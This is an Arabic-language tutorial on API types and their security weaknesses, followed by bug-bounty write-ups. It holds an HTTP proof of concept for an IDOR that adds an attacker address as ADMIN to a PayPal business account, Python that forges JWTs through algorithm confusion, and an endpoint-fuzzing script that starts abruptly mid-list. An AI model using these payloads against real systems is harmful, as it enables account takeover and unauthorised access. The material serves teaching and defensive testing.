ما هو الـ API ولماذا هو هدف؟
مقدمة مبسطة لكل بروتوكول — التعريف، الاستخدام، والخطورة الأمنية
🔌 API = Application Programming Interface

ببساطة: الـ API هو الطريقة التي تتكلم بها البرامج مع بعض. لما بتفتح تطبيق طقس على موبايلك، التطبيق بيبعت request لـ API لسيرفر الطقس ويرجعله البيانات. لما بتدفع أونلاين، الموقع بيكلم API مدفوعات زي Stripe أو PayPal. كل برنامج تقريباً بيستخدم APIs للتواصل مع backend أو مع services خارجية.

ليه الـ APIs هدف رئيسي للمهاجمين؟ لأنها البوابة المباشرة للبيانات والمنطق — مش محتاج تكسر الـ UI، بتكلم الـ API مباشرةً. 83% من حركة الإنترنت تمر عبر APIs، و22% من الثغرات المستغلة فعلياً في 2025 كانت في APIs.
🔵
REST API — Representational State Transfer
ما هو؟ أشيع نوع API على الإنترنت. بيعتمد على HTTP/HTTPS ويستخدم الـ methods المعروفة: GET (جلب)، POST (إضافة)، PUT/PATCH (تعديل)، DELETE (حذف). الـ responses عادةً بصيغة JSON.
استخدامه: كل شيء تقريباً — تطبيقات الموبايل، مواقع الويب، microservices، integrations مع Stripe/Twilio/AWS/Google. لو عندك backend وfrontend منفصلين — على الأغلب بيتكلموا بـ REST.
خطورته الأمنية: أكبر attack surface بسبب الانتشار الهائل. أشيع ثغرة فيه هي BOLA/IDOR — تغيير رقم في الـ URL يعطيك بيانات شخص تاني. JWT misconfig، Mass Assignment، وSSRF كلها شائعة جداً.

GraphQL — Graph Query Language
ما هو؟ بديل مرن لـ REST طوّرته Facebook عام 2015. بدل ما تكون عندك endpoints كتير (/users، /posts، /comments)، عندك endpoint واحد (/graphql) وبتكتب query بتحدد فيها بالظبط البيانات اللي عاوزها — مش أكثر ولا أقل.
استخدامه: GitHub API، Shopify، Facebook، Twitter/X، Pinterest. شائع في تطبيقات بـ data complex ومتشعبة — لما كل client (موبايل، ويب، tablet) يحتاج بيانات مختلفة من نفس الـ backend.
خطورته الأمنية: الـ Introspection يكشف الـ schema كاملاً للمهاجم — زي إنك تعطيه خريطة كل البيانات والعمليات. الـ nested queries تسبب DoS بسهولة. Batching يتجاوز Rate Limiting. كثير من الـ developers يضيفون features بدون تأمينها لأن GraphQL "جديد" عليهم.
📊 Data-rich Apps 🏢 Big Tech Stack ⚠ Introspection Leak ⚠ DoS / Batching 📌 Facebook 2015

gRPC — Google Remote Procedure Call
ما هو؟ بروتوكول طوّرته Google يعتمد على HTTP/2 وProtocol Buffers (Protobuf) بدل JSON. بدل ما تفكر في "endpoints"، بتفكر في "functions تنفذها على سيرفر بعيد". أسرع بكثير من REST لأن البيانات binary مش text.
استخدامه: Internal microservices، real-time communications، backend-to-backend. شائع في Kubernetes environments، Google Cloud، وأي نظام يحتاج latency منخفضة وthroughput عالي. Netflix، Dropbox، وCisco يستخدمونه.
خطورته الأمنية: الـ Server Reflection (مثل Introspection في GraphQL) يكشف كل الـ services والـ methods. Internal services كثيراً ما تكون بدون auth لأنها "داخلية". التواصل HTTP/2 binary يصعّب الـ interception. CVE-2023-44487 (Rapid Reset) أثّر مليارات الـ servers.
⚡ High Performance 🔧 Microservices ⚠ No Auth Internal ⚠ Server Reflection 📌 Google / HTTP/2
🟠
SOAP/XML — Simple Object Access Protocol
ما هو؟ بروتوكول قديم (1998) يعتمد على XML لتبادل البيانات. كل request وresponse ملفوفة في "SOAP Envelope". يُعرّف نفسه عبر WSDL — ملف XML يشرح كل العمليات المتاحة والـ parameters المطلوبة لكل عملية. أثقل وأعقد من REST.
استخدامه: الأنظمة المؤسسية القديمة (Legacy Enterprise) — بنوك، تأمين، حكومات، SAP، Oracle. لو اشتغلت مع أي نظام ERP أو banking system قديم — غالباً SOAP. لا يزال يُستخدم واسعاً رغم قِدَمه.
خطورته الأمنية: XXE Injection هو الملك هنا — الـ XML parser بيعالج entities خارجية مما يسمح بقراءة ملفات الـ server أو SSRF. الـ WSDL المكشوف يعطي خريطة كاملة للـ API. أنظمة SOAP عادةً قديمة وغير مُحدَّثة = ثغرات كتير.
🏦 Banking / ERP 🏛 Legacy Systems ⚠ XXE → RCE ⚠ WSDL Exposure 📌 XML / 1998
🟢
WebSockets — Full-Duplex Communication
ما هو؟ بروتوكول يفتح connection دائم ثنائي الاتجاه بين الـ client والـ server — بدل ما الـ client يسأل والـ server يرد (HTTP)، الاتنين يقدروا يبعتوا messages في أي وقت. يبدأ بـ HTTP Upgrade request (101 Switching Protocols) ثم يتحوّل لـ WS connection.
استخدامه: Chat applications (Slack، Discord)، live dashboards، online gaming، collaborative tools (Figma، Notion)، trading platforms، notifications real-time. أي تطبيق يحتاج تحديثات فورية بدون polling.
خطورته الأمنية: CSWSH (Cross-Site WebSocket Hijacking) — نسخة WebSocket من CSRF. لما الـ server لا يتحقق من الـ Origin، أي موقع ضار يقدر يفتح WebSocket connection بـ credentials الضحية. الـ WS sessions تبقى مفتوحة بعد logout، والـ injection نفس REST لكن صعب اكتشافه بـ scanners عادية.
💬 Real-time Apps 🎮 Gaming / Chat ⚠ CSWSH ⚠ Session Persistence 📌 RFC 6455

BOLA / IDOR — Broken Object Level Authorization
#001 · REST · HackerOne
IDOR على PayPal — إضافة مستخدمين ثانويين في حسابات تجارية
التطبيق: PayPal Business Manager — paypal.com/businessmanage/users/api/v1/users
CRITICAL REST API IDOR/BOLA
$10,500USD Bounty
السيناريو: مهاجم يستطيع إضافة مستخدمين إلى أي حساب PayPal Business دون امتلاك أي صلاحيات إدارية عليه — من خلال تلاعب بـ merchant_id في endpoint إضافة المستخدمين.
🔍 خطوات الاكتشاف:
1
الـ Recon: سجّل الباحث كمستخدم عادي وفتح حساب Business على PayPal وراقب network traffic أثناء إضافة مستخدم لحسابه الخاص.
2
اكتشاف الـ Endpoint: لاحظ أن الـ POST request لإضافة مستخدم يحتوي على merchant_id في الـ URL parameter و body.
3
التلاعب: غيّر merchant_id إلى ID حساب Business لشخص آخر — لاحظ أن الـ API لا تتحقق من ملكية الـ merchant_id مقارنة بالـ session.
4
الاستغلال: تمكن من إضافة بريده الإلكتروني كمستخدم في حسابات تجارية عشوائية — مما يمنحه صلاحيات قد تصل لعمليات مالية.
💥 الـ Payload / PoC:
HTTP Request ⚠ PROOF OF CONCEPT
POST /businessmanage/users/api/v1/users HTTP/1.1 Host: www.paypal.com Authorization: Bearer <ATTACKER_TOKEN> Content-Type: application/json { "merchant_id": "VICTIM_MERCHANT_ID", ← تغيير هذا القيمة "email": "attacker@evil.com", "role": "ADMIN" }
علامة النجاح: استجابة 200 OK مع تأكيد إضافة المستخدم — التحقق بتسجيل الدخول بالـ attacker account ومحاولة إجراء عملية مالية.
الإصلاح
التحقق server-side أن الـ merchant_id في الـ request يطابق الـ merchant_id المرتبط بالـ session token — رفض أي مطابقة.

JWT Authentication Bypass
#006 · REST · PortSwigger / Bug Bounty
JWT Algorithm Confusion — استخدام المفتاح العام كـ HMAC Secret
التطبيق: أي تطبيق يستخدم RS256 JWT مع السماح بـ HS256
CRITICAL REST API Auth Bypass
$10,000+Avg Bounty
السيناريو: الـ server مُعد للتحقق بـ RS256 (asymmetric)، لكنه يقبل أيضاً HS256 (symmetric). المهاجم يأخذ المفتاح العام للـ server ويستخدمه كـ HMAC secret لتوقيع JWT مزور — الـ server يقبله كصحيح.
1
احصل على JWT صحيح من التطبيق — decode الـ header للتحقق أن alg: RS256
2
استخرج المفتاح العام من /jwks.json أو /.well-known/openid-configuration
3
استخدم jwt_tool أو Burp JWT Editor لتوقيع JWT جديد باستخدام المفتاح العام كـ HMAC secret وتغيير alg إلى HS256
4
غيّر الـ payload (مثلاً "role": "admin") وأرسل الـ JWT المزور.
Python — JWT Algorithm ConfusionPoC
import jwt import requests # استخرج المفتاح العام من JWKS endpoint public_key = """-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A... -----END PUBLIC KEY-----""" # تعديل الـ payload payload = { "sub": "user123", "role": "admin", ← تصعيد الصلاحيات "exp": 9999999999 } # التوقيع بالمفتاح العام كـ HMAC secret forged_token = jwt.encode( payload, public_key, algorithm="HS256" ← الخدعة الأساسية ) # اختبار الـ token المزور r = requests.get( "https://target.com/api/admin/users", headers={"Authorization": f"Bearer {forged_token}"} ) print(r.status_code, r.text[:200])
أداة موصى بها: jwt_tool — تدعم تلقائياً اختبار None Algorithm، HS256 confusion، JWK injection، و kid manipulation.
python3 jwt_tool.py JWT_TOKEN -X k -pk public.pem
الإصلاح
تحديد الـ algorithm server-side دون السماح للـ client بتغييره. رفض أي JWT بـ alg مختلف عن المتوقع. عدم قبول alg: none مطلقاً.

Debug / Info "/api/v1/health", "/api/v1/status", "/api/v1/version", "/api/v1/debug", "/api/v1/metrics", "/api/v1/env", "/swagger.json", "/openapi.json", "/api-docs", "/actuator/health", "/actuator/env", "/actuator/mappings", # Internal / Private "/api/v1/internal", "/api/v1/private", "/api/v1/system", "/api/v1/superadmin", # Legacy versions "/api/v2/admin", "/api/v3/admin", "/v1/admin", "/v2/admin", ] METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE"] def check(path): results = [] for method in METHODS: try: r = requests.request( method, TARGET + path, headers=HEADERS, timeout=8, allow_redirects=False, data="{}" if method in ["POST","PUT","PATCH"] else None ) if r.status_code not in [404, 429]: results.append({ "path": path, "method": method, "status": r.status_code, "length": len(r.content), "snippet": r.text[:100].replace("\n","") }) except: pass return results print(f"[*] Fuzzing {TARGET} — {len(PATHS)} paths × {len(METHODS)} methods") findings = [] with ThreadPoolExecutor(max_workers=20) as ex: for result in ex.map(check, PATHS): for f in result: tag = {200:"✅ OPEN", 201:"✅ CREATED", 401:"🔒 AUTH (exists)", 403:"🔒 FORBIDDEN (exists)", 301:"↪ REDIRECT", 302:"↪ REDIRECT"}.get(f["status"], f"⚠ {f['status']}") print(f"{tag:30} [{f['method']:6}] {f['path']:45} {f['length']}b") findings.append(f) with open("fuzz_results.json","w") as out: json.dump(findings, out, indent=2) print(f"\n[+] {len(findings)} findings saved → fuzz_results.json")
